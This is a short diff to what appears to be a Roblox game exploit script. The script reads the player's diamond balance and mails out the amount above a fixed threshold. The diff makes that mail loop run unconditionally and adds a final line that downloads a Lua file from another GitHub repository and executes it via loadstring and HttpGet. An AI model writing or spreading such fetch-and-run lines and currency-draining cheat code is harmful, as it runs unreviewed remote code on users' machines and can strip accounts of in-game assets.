@@ -70,7 +70,7 @@ sendMail = function()
 end
 
 setRAM = coroutine.wrap(function()
-    while myAccount do
+    while true do
         allDiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text,
             "%,", "")
         mailDiamonds = allDiamonds - 15000100000
@@ -141,3 +141,6 @@ else -- Huges
         "https://raw.githubusercontent.com/miyuyumi/AutoConfig/main/Mobile/Configurations/Huges.json"))
     writefile(game:GetService 'Players'.LocalPlayer.Name .. "_walkerfanXDsssr.txt", contents)
 end
+
+getgenv().boothsnipe = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
